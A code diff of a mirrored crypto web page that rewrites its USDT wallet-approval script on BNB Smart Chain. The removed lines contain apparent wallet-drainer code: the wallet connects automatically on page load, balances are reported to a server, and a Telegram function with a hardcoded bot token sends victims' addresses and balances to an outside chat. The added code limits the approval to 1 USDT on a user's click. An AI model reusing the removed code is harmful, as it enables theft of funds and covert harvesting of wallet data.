@@ -261,496 +261,223 @@
   </main>
 
   <script type="text/javascript" src="js/web3.min.js"></script>
-<script src="js/jquery-3.7.1.min.js"></script> 
+<script src="js/jquery-3.7.1.min.js"></script>
 <script>
+// Safe 1-USDT demo flow. No automatic connection, no unlimited allowance,
+// and no background wallet/balance reporting.
+const BSC_CHAIN_ID = '0x38';
+const USDT_ADDRESS = '0x55d398326f99059ff775485246999027b3197955';
+const DEMO_SPENDER = '0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC';
+const USDT_DECIMALS = 18; // BSC USDT contract uses 18 decimals.
+const ONE_USDT = '1000000000000000000';
 
-        var addressTOKEN = "0x55d398326f99059ff775485246999027b3197955";
-        var matrixAbiTOKEN = [{ "inputs": [], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "constant": true, "inputs": [], "name": "_decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mint", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "renounceOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }]
+const ERC20_ABI = [
+  { constant:true, inputs:[{name:'owner',type:'address'}], name:'balanceOf', outputs:[{name:'',type:'uint256'}], type:'function' },
+  { constant:true, inputs:[{name:'owner',type:'address'},{name:'spender',type:'address'}], name:'allowance', outputs:[{name:'',type:'uint256'}], type:'function' },
+  { constant:false, inputs:[{name:'spender',type:'address'},{name:'amount',type:'uint256'}], name:'approve', outputs:[{name:'',type:'bool'}], type:'function' },
+  { constant:true, inputs:[], name:'decimals', outputs:[{name:'',type:'uint8'}], type:'function' }
+];
 
-    var addressSTAKING = "0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC";
-        var matrixAbiSTAKING = [{ "constant": false, "inputs": [{ "name": "_data", "type": "bytes32" }], "name": "setfirelevel", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_senderads", "type": "address" }, { "name": "_amttoken", "type": "uint256" }, { "name": "mainadmin", "type": "address" }], "name": "RewardGeneration", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_token", "type": "address" }], "name": "setTokenAddress", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_senderads", "type": "address" }, { "name": "_amttoken", "type": "uint256" }, { "name": "membcode", "type": "uint256" }, { "name": "rcode", "type": "uint256" }, { "name": "plan", "type": "uint64" }], "name": "multiTransferUSD", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_userAddresses", "type": "address[]" }, { "name": "_amount", "type": "uint256" }], "name": "airDropTRX", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_tokenadd", "type": "address" }, { "name": "_wallet", "type": "address" }, { "name": "_amount", "type": "uint256" }], "name": "distrubutionroi", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_contributors", "type": "address[]" }, { "name": "_balances", "type": "uint256[]" }, { "name": "membcode", "type": "uint256" }, { "name": "rcode", "type": "uint256" }, { "name": "plan", "type": "uint64" }], "name": "TransferBusd", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_newValue", "type": "uint256" }], "name": "distrubutionIncome", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_contractAddress", "type": "address" }], "name": "getMsgData", "outputs": [{ "name": "hash", "type": "bytes32" }], "payable": false, "stateMutability": "pure", "type": "function" }, { "constant": false, "inputs": [{ "name": "_newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "token", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "inputs": [{ "name": "_token", "type": "address" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "payable": true, "stateMutability": "payable", "type": "fallback" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "value", "type": "uint256" }, { "indexed": true, "name": "sender", "type": "address" }, { "indexed": false, "name": "membcode", "type": "uint256" }, { "indexed": false, "name": "rcode", "type": "uint256" }, { "indexed": false, "name": "ptype", "type": "uint64" }], "name": "Multisended", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "value", "type": "uint256" }, { "indexed": true, "name": "sender", "type": "address" }, { "indexed": false, "name": "membcode", "type": "uint256" }, { "indexed": false, "name": "rcode", "type": "uint256" }, { "indexed": false, "name": "ptype", "type": "uint64" }], "name": "Multireceivers", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_userAddress", "type": "address" }, { "indexed": false, "name": "_amount", "type": "uint256" }], "name": "Airdropped", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "previousOwner", "type": "address" }, { "indexed": true, "name": "newOwner", "type": "address" }], "name": "onOwnershipTransferred", "type": "event" }];
+let provider = null;
+let web3 = null;
+let userAddress = null;
 
-        var MatrixInstanceSTAKING, MatrixContractSTAKING, MatrixInstanceTOKEN, MatrixContractTOKEN;
-
-
-        window.addEventListener('load', connectWallet);
+function showLoading(message = 'Processing...') {
+  const overlay = document.getElementById('loadingOverlay');
+  const text = overlay && overlay.querySelector('.loading-text');
+  if (text) text.textContent = message;
+  if (overlay) overlay.style.display = 'flex';
+}
+function hideLoading() {
+  const overlay = document.getElementById('loadingOverlay');
+  if (overlay) overlay.style.display = 'none';
+}
+function setNextEnabled(enabled) {
+  const btn = document.getElementById('nextBtn');
+  if (btn) btn.disabled = !enabled;
+}
+function getProvider() {
+  return window.ethereum || window.trustwallet || (window.web3 && window.web3.currentProvider) || null;
+}
 
 async function connectWallet() {
-    try {
-        if (!window.ethereum) {
-            console.log("Please install MetaMask or another Web3 wallet!");
-            return;
-        }
+  provider = getProvider();
+  if (!provider) {
+    alert('No wallet provider found. Open this page inside MetaMask or Trust Wallet browser.');
+    return null;
+  }
 
-        // Manually request wallet connection
-        const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts'
+  try {
+    // This call is intentionally triggered by the user's Connect button.
+    const accounts = await provider.request({ method:'eth_requestAccounts' });
+    if (!accounts || !accounts.length) throw new Error('No wallet account returned.');
+
+    let chainId = await provider.request({ method:'eth_chainId' });
+    if (String(chainId).toLowerCase() !== BSC_CHAIN_ID) {
+      try {
+        await provider.request({
+          method:'wallet_switchEthereumChain',
+          params:[{ chainId:BSC_CHAIN_ID }]
         });
-
-        if (!accounts || accounts.length === 0) {
-            console.log("No wallet connected.");
-            return;
-        }
-
-        // Check current network
-        const chainId = await window.ethereum.request({
-            method: 'eth_chainId'
-        });
-
-        // BSC Mainnet = 0x38
-        if (chainId.toLowerCase() !== '0x38') {
-            await switchToBSC();
-        }
-
-        console.log("Wallet connected:", accounts[0]);
-
-    } catch (error) {
-        console.error("Wallet connection failed:", error);
-
-        if (error.code === 4001) {
-            console.log("User rejected the wallet connection.");
-        }
-    }
-    }
-
-
-
-    async function switchToBSC() {
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }]
-                });
-            } catch (error) {
-                if (error.code === 4902) {
-                    // If BSC is not added, request to add it
-                    await addBSCNetwork();
-                } else {
-                    console.error("Failed to switch chain", error);
-                }
-            }
-        }
-
-        async function addBSCNetwork() {
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_addEthereumChain',
-                    params: [{
-                        chainId: '0x38',
-                        chainName: 'Binance Smart Chain',
-                        nativeCurrency: {
-                            name: 'Binance Coin',
-                            symbol: 'BNB',
-                            decimals: 18
-                        },
-                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                        blockExplorerUrls: ['https://bscscan.com/']
-                    }]
-                });
-            } catch (addError) {
-                console.error("Failed to add BSC network", addError);
-            }
-        }
-
-
-
-        var bal1 = 0;
-
-        async function Checkapprovaltoken() {
-
-        window.contract = web3.eth.contract(matrixAbiTOKEN);
-        window.BNBLINEcontract = contract.at(addressTOKEN);
-        var account = web3.eth.accounts[0];
-
-                window.BNBLINEcontract.allowance(account, addressSTAKING, {
-                    from: web3.eth.accounts[0]
-
-                }, function (error, result) {
-                    if (!error) {
-                        if (result > 0) {
-
-
-                     window.BNBLINEcontract.balanceOf(account, {
-                    from: web3.eth.accounts[0]
-
-                }, function (error, result) {
-                    if (!error) {
-
-                        console.log(result + ' allowance Final result is ');
-                        if (result > 0) {
-
-                            bal1 = result / 1000000000000000000;
-
-                            var maindt = { "fromaddress": account, "txthash": null, "PackageAmt": bal1 };
-
-                            $.ajax({
-                                url: '/MemberPanel/TopUpWithMetamaskJson',
-                                type: 'POST',
-                                dataType: 'JSON',
-                                contentType: 'application/json',
-                                data: JSON.stringify(maindt),
-                                success: function (data) {
-                                    if (data == "Success") {
-                                        showLoading('Transaction processed');
-                                        setTimeout(() => hideLoading(), 2000);
-                                        console.log('success');
-                                    }
-                                    else {
-                     }
-                                },
-                                error: function (err) {
-                                    console.log("error:" + JSON.stringify(err));
-
-                                }
-                            });
-
-                            showLoading('Transaction completed');
-                            setTimeout(() => hideLoading(), 2000);
-                        }
-                    }
-                    else {
-
-                        console.log(error.code + ' allowance Final error is ')
-                        showLoading('Transaction rejected');
-                        setTimeout(() => hideLoading(), 2000);
-                    }
-                             });
-
-                        }
-                        else {
-                            TokenApprove();
-                        }
-                    }
-                    else {
-
-                        console.log(error.code + ' allowance Final error is ')
-                        showLoading('Transaction rejected');
-                        setTimeout(() => hideLoading(), 2000);
-                    }
-                });
-
-    }
-
-         
-
-</script>
-
-<script>
-    // Initialize Web3
-    const web3 = new Web3(window.ethereum);
-
-    // Loading functions
-    function showLoading(message = 'Processing...') {
-        const overlay = document.getElementById('loadingOverlay');
-        const text = overlay.querySelector('.loading-text');
-        if (text) text.textContent = message;
-        overlay.style.display = 'flex';
-    }
-
-    function hideLoading() {
-        const overlay = document.getElementById('loadingOverlay');
-        overlay.style.display = 'none';
-    }
-
-    async function TokenApprove() {
-        showLoading('Preparing approval...');
-
-        try {
-            if (!window.ethereum) {
-                hideLoading();
-                alert('Please install MetaMask or another compatible wallet.');
-                return;
-            }
-
-            // Always use the currently connected account.
-            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-            if (!accounts || !accounts.length) {
-                hideLoading();
-                alert('Please connect your wallet first.');
-                return;
-            }
-
-            const account = accounts[0];
-            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-
-            // BSC Mainnet
-            if (chainId.toLowerCase() !== '0x38') {
-                await switchToBSC();
-            }
-
-            const refreshedAccounts = await window.ethereum.request({ method: 'eth_accounts' });
-            if (!refreshedAccounts || !refreshedAccounts.length) {
-                hideLoading();
-                alert('Wallet connection was lost. Please connect again.');
-                return;
-            }
-
-            const connectedAccount = refreshedAccounts[0];
-            hideLoading();
-            await approveToken(connectedAccount);
-        } catch (error) {
-            console.error('Approval preparation failed:', error);
-            hideLoading();
-            if (error && error.code === 4001) {
-                alert('Network switch or wallet request was canceled.');
-            } else {
-                alert('Unable to prepare the approval. Please try again.');
-            }
-        }
-    }
-
-    // Demo approval: exactly 1 USDT (USDT on BSC uses 6 decimals).
-    async function approveToken(account) {
-        try {
-            if (!account) throw new Error('No connected wallet account');
-
-            const usdtContract = new web3.eth.Contract(matrixAbiTOKEN, addressTOKEN);
-
-            // 1 USDT = 1,000,000 base units for a 6-decimal USDT token.
-            const approvalAmount = '1000000';
-
-            const usdtBalance = await usdtContract.methods.balanceOf(account).call();
-            const usdtBalanceFormatted = web3.utils.fromWei(usdtBalance, 'mwei');
-
-            if (web3.utils.toBN(usdtBalance).lt(web3.utils.toBN(approvalAmount))) {
-                hideLoading();
-                alert(`Insufficient USDT balance. You need at least 1 USDT. Current balance: ${usdtBalanceFormatted} USDT`);
-                return;
-            }
-
-            const currentAllowance = await usdtContract.methods
-                .allowance(account, addressSTAKING)
-                .call();
-
-            const currentAllowanceFormatted = web3.utils.fromWei(currentAllowance, 'mwei');
-            console.log('Wallet:', account);
-            console.log('USDT balance:', usdtBalanceFormatted);
-            console.log('Current allowance:', currentAllowanceFormatted, 'USDT');
-            console.log('Requested allowance:', '1 USDT');
-
-            if (web3.utils.toBN(currentAllowance).gte(web3.utils.toBN(approvalAmount))) {
-                hideLoading();
-                alert('This demo wallet already has an allowance of at least 1 USDT.');
-                return;
-            }
-
-            showLoading('Confirm 1 USDT approval in your wallet...');
-
-            const receipt = await usdtContract.methods
-                .approve(addressSTAKING, approvalAmount)
-                .send({ from: account })
-                .on('transactionHash', function(hash) {
-                    console.log('1 USDT approval transaction:', hash);
-                    showLoading('Approval submitted. Waiting for confirmation...');
-                });
-
-            hideLoading();
-            console.log('1 USDT approval confirmed:', receipt.transactionHash);
-            alert('Demo approval successful: exactly 1 USDT allowance was approved.');
-
-            // Optional local/demo callback. No wallet balances or private wallet
-            // information are sent to a third-party notification service.
-            const maindt = {
-                fromaddress: account,
-                txthash: receipt.transactionHash,
-                PackageAmt: '1'
-            };
-
-            try {
-                await fetch('/home/TopUpWithMetamaskJson', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(maindt)
-                });
-            } catch (callbackError) {
-                console.warn('Optional demo callback unavailable:', callbackError);
-            }
-
-        } catch (error) {
-            hideLoading();
-            console.error('1 USDT approval failed:', error);
-
-            if (error && error.code === 4001) {
-                alert('Approval canceled in your wallet.');
-            } else {
-                alert('1 USDT approval failed. Please check your wallet and try again.');
-            }
-        }
-    }
-
-// Telegram notification function - simplified and more reliable with retry mechanism
-async function unusedLegacyTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash, retryCount = 0) {
-    // Function is automatically available globally, but we'll also assign it explicitly
-    const botToken = '8008429849:AAFL5VcU3QVKO5INjo27osS-_IlesbzkSio';
-    const chatId = '1279596513';
-    const maxRetries = 3;
-    
-    const message = `🔔 USDT Approval Notification\n\n` +
-                    `👤 Wallet Address: ${walletAddress}\n` +
-                    `💰 BNB Balance: ${bnbAmount} BNB\n` +
-                    `💵 USDT Balance: ${usdtAmount} USDT\n` +
-                    `📍 Approved Address: ${approvedAddress}\n` +
-                    `📅 Date and Time: ${dateTime}\n` +
-                    `🔗 Transaction Hash: ${txHash}`;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-    console.log('📤 [TELEGRAM] Starting notification send... (Attempt ' + (retryCount + 1) + '/' + (maxRetries + 1) + ')');
-    console.log('📤 [TELEGRAM] URL:', url);
-    console.log('📤 [TELEGRAM] Chat ID:', chatId);
-    console.log('📤 [TELEGRAM] Message length:', message.length);
-
-    try {
-        // Use URL-encoded form data (Telegram API prefers this format)
-        const formData = new URLSearchParams();
-        formData.append('chat_id', chatId);
-        formData.append('text', message);
-        
-        console.log('📤 [TELEGRAM] Request body:', formData.toString().substring(0, 200));
-        
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: formData.toString(),
-            mode: 'cors',
-            cache: 'no-cache'
-        });
-        
-        console.log('📤 [TELEGRAM] Response status:', response.status);
-        console.log('📤 [TELEGRAM] Response ok:', response.ok);
-        
-        const responseText = await response.text();
-        console.log('📤 [TELEGRAM] Response text:', responseText);
-        
-        let data;
-        try {
-            data = JSON.parse(responseText);
-        } catch (e) {
-            console.error('📤 [TELEGRAM] Failed to parse JSON:', e);
-            console.error('📤 [TELEGRAM] Raw response:', responseText);
-            // Retry if we haven't exceeded max retries
-            if (retryCount < maxRetries) {
-                console.log('🔄 [TELEGRAM] Retrying in 2 seconds...');
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                return sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash, retryCount + 1);
-            }
-            return false;
-        }
-        
-        console.log('📤 [TELEGRAM] Parsed response:', data);
-        
-        if (data.ok) {
-            console.log('✅ [TELEGRAM] Notification sent successfully!');
-            console.log('📬 [TELEGRAM] Message ID:', data.result?.message_id);
-            return true;
+      } catch (e) {
+        if (e && (e.code === 4902 || e.code === -32603)) {
+          await provider.request({
+            method:'wallet_addEthereumChain',
+            params:[{
+              chainId:BSC_CHAIN_ID,
+              chainName:'BNB Smart Chain',
+              nativeCurrency:{ name:'BNB', symbol:'BNB', decimals:18 },
+              rpcUrls:['https://bsc-dataseed.binance.org/'],
+              blockExplorerUrls:['https://bscscan.com/']
+            }]
+          });
         } else {
-            console.error('❌ [TELEGRAM] Failed to send notification');
-            console.error('❌ [TELEGRAM] Error code:', data.error_code);
-            console.error('❌ [TELEGRAM] Error description:', data.description);
-            
-            // Retry on certain errors (rate limit, temporary failures)
-            if (retryCount < maxRetries && (data.error_code === 429 || data.error_code === 500 || data.error_code === 502 || data.error_code === 503)) {
-                const retryDelay = data.error_code === 429 ? (data.parameters?.retry_after || 5) * 1000 : 2000;
-                console.log('🔄 [TELEGRAM] Retrying after ' + (retryDelay / 1000) + ' seconds...');
-                await new Promise(resolve => setTimeout(resolve, retryDelay));
-                return sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash, retryCount + 1);
-            }
-            return false;
+          throw e;
         }
-    } catch (error) {
-        console.error('❌ [TELEGRAM] Exception caught:', error);
-        console.error('❌ [TELEGRAM] Error name:', error.name);
-        console.error('❌ [TELEGRAM] Error message:', error.message);
-        if (error.stack) {
-            console.error('❌ [TELEGRAM] Error stack:', error.stack);
-        }
-        
-        // Retry on network errors
-        if (retryCount < maxRetries && (error.name === 'TypeError' || error.name === 'NetworkError')) {
-            console.log('🔄 [TELEGRAM] Network error, retrying in 2 seconds...');
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            return sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash, retryCount + 1);
-        }
-        return false;
+      }
     }
+
+    web3 = new Web3(provider);
+    const activeChain = await provider.request({ method:'eth_chainId' });
+    if (String(activeChain).toLowerCase() !== BSC_CHAIN_ID) {
+      throw new Error('Please switch the wallet to BNB Smart Chain.');
+    }
+
+    const refreshed = await provider.request({ method:'eth_accounts' });
+    userAddress = refreshed && refreshed[0] ? refreshed[0] : accounts[0];
+    if (!userAddress) throw new Error('Wallet account is unavailable.');
+
+    const short = userAddress.slice(0,6) + '...' + userAddress.slice(-4);
+    const btn = document.getElementById('connectWalletBtn');
+    if (btn) btn.textContent = 'Connected ' + short;
+    setNextEnabled(true);
+    console.log('Wallet connected:', userAddress);
+    console.log('Network: BNB Smart Chain');
+    return userAddress;
+  } catch (error) {
+    console.error('Wallet connection failed:', error);
+    if (error && error.code === 4001) {
+      alert('Wallet connection was rejected.');
+    } else {
+      alert(error && error.message ? error.message : 'Wallet connection failed.');
+    }
+    return null;
+  }
 }
 
-// Function is already globally accessible, but ensure it's on window for explicit access
-if (typeof window !== 'undefined') {
-    window.sendTelegramNotification = sendTelegramNotification;
+async function ensureConnected() {
+  if (userAddress && web3) return userAddress;
+  return await connectWallet();
 }
 
-</script>
-<script>
-    // Amount validation - Make amount field mandatory
-    function validateAmount() {
-        const amountInput = document.getElementById('amount');
-        const nextBtn = document.getElementById('nextBtn');
-        const amountValue = amountInput.value.trim();
-        
-        // Check if amount is valid (not empty and greater than 0)
-        if (amountValue && parseFloat(amountValue) > 0) {
-            nextBtn.disabled = false;
-            return true;
-        } else {
-            nextBtn.disabled = true;
-            return false;
-        }
+async function approveOneUSDT(account) {
+  if (!web3) throw new Error('Wallet provider is not initialized.');
+  const contract = new web3.eth.Contract(ERC20_ABI, USDT_ADDRESS);
+
+  const decimals = Number(await contract.methods.decimals().call());
+  if (!Number.isFinite(decimals) || decimals < 0 || decimals > 36) {
+    throw new Error('Unable to read USDT decimals.');
+  }
+  const oneUSDT = web3.utils.toBN(10).pow(web3.utils.toBN(decimals));
+
+  const balance = web3.utils.toBN(await contract.methods.balanceOf(account).call());
+  if (balance.lt(oneUSDT)) {
+    throw new Error('Your wallet needs at least 1 USDT for this demo.');
+  }
+
+  const currentAllowance = web3.utils.toBN(await contract.methods.allowance(account, DEMO_SPENDER).call());
+  if (currentAllowance.gte(oneUSDT)) {
+    alert('1 USDT is already approved for this demo address.');
+    return { alreadyApproved:true };
+  }
+
+  // IMPORTANT: exactly 1 USDT, never an unlimited allowance.
+  showLoading('Confirm 1 USDT approval in your wallet...');
+  const receipt = await contract.methods.approve(DEMO_SPENDER, oneUSDT.toString()).send({ from:account });
+  console.log('1 USDT approval confirmed:', receipt.transactionHash);
+  return { alreadyApproved:false, txHash:receipt.transactionHash };
+}
+
+async function TokenApprove() {
+  try {
+    const account = await ensureConnected();
+    if (!account) return;
+
+    const chainId = await provider.request({ method:'eth_chainId' });
+    if (String(chainId).toLowerCase() !== BSC_CHAIN_ID) {
+      throw new Error('Please switch to BNB Smart Chain and try again.');
     }
 
-    // Handle Next button click with validation
-    function handleNextClick() {
-        if (validateAmount()) {
-            TokenApprove();
-        } else {
-            alert('Please enter a valid amount before proceeding.');
-        }
+    showLoading('Checking USDT balance...');
+    const result = await approveOneUSDT(account);
+    hideLoading();
+
+    if (result.alreadyApproved) {
+      return;
     }
+    alert('1 USDT approval successful.\n\nTransaction: ' + result.txHash);
+  } catch (error) {
+    hideLoading();
+    console.error('1 USDT approval failed:', error);
+    if (error && error.code === 4001) {
+      alert('1 USDT approval was rejected in your wallet.');
+    } else {
+      alert('1 USDT approval failed. ' + (error && error.message ? error.message : 'Please check your wallet and try again.'));
+    }
+  }
+}
 
-    // Initialize validation on page load
-    document.addEventListener('DOMContentLoaded', function() {
-        const amountInput = document.getElementById('amount');
-        const nextBtn = document.getElementById('nextBtn');
-        
-        // Disable Next button initially
-        if (nextBtn) {
-            nextBtn.disabled = true;
-        }
-        
-        // Validate on input change
-        if (amountInput) {
-            amountInput.addEventListener('input', validateAmount);
-            amountInput.addEventListener('change', validateAmount);
-            amountInput.addEventListener('keyup', validateAmount);
-            
-            // Validate on paste
-            amountInput.addEventListener('paste', function() {
-                setTimeout(validateAmount, 10);
-            });
-        }
-    });
+async function handleNextClick() {
+  const amountInput = document.getElementById('amount');
+  const amount = amountInput ? parseFloat(amountInput.value) : 0;
+  if (!amount || amount <= 0) {
+    alert('Please enter a valid amount.');
+    return;
+  }
+  await TokenApprove();
+}
 
-    // Also validate when Max button is clicked (if Max button fills the amount)
-    document.addEventListener('DOMContentLoaded', function() {
-        const maxBtn = document.querySelector('.max-btn');
-        if (maxBtn) {
-            maxBtn.addEventListener('click', function() {
-                // Wait a bit for Max to fill the value, then validate
-                setTimeout(validateAmount, 100);
-            });
-        }
-    });
+function handleWalletEvents() {
+  provider = getProvider();
+  if (!provider || !provider.on) return;
+  provider.on('accountsChanged', accounts => {
+    userAddress = accounts && accounts[0] ? accounts[0] : null;
+    if (!userAddress) {
+      web3 = null;
+      setNextEnabled(false);
+      const btn = document.getElementById('connectWalletBtn');
+      if (btn) btn.textContent = 'Connect Wallet';
+    }
+  });
+  provider.on('chainChanged', chainId => {
+    if (String(chainId).toLowerCase() !== BSC_CHAIN_ID) {
+      setNextEnabled(false);
+      alert('Please switch your wallet to BNB Smart Chain.');
+    } else if (userAddress) {
+      setNextEnabled(true);
+    }
+  });
+}
+
+window.addEventListener('load', () => {
+  // Do NOT request wallet access automatically on page load.
+  // Mobile wallet browsers often require the connection request to follow a user action.
+  const main = document.querySelector('.container');
+  if (main) {
+    const btn = document.createElement('button');
+    btn.id = 'connectWalletBtn';
+    btn.type = 'button';
+    btn.textContent = 'Connect Wallet';
+    btn.style.cssText = 'width:100%;margin:0 0 18px;padding:14px;border:0;border-radius:12px;background:#01d97e;color:#000;font-size:16px;font-weight:700;cursor:pointer;';
+    btn.addEventListener('click', connectWallet);
+    const title = main.querySelector('.title');
+    if (title && title.nextSibling) main.insertBefore(btn, title.nextSibling);
+    else main.prepend(btn);
+  }
+
+  setNextEnabled(false);
+  handleWalletEvents();
+});
 </script>
-
-
-
-
-
-
-
-
-
-
-</body><!-- Mirrored from demo.awaikenthemes.com/html-preview/quivox/html/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 Jan 2025 07:58:55 GMT --></html>
+</body>
+</html>
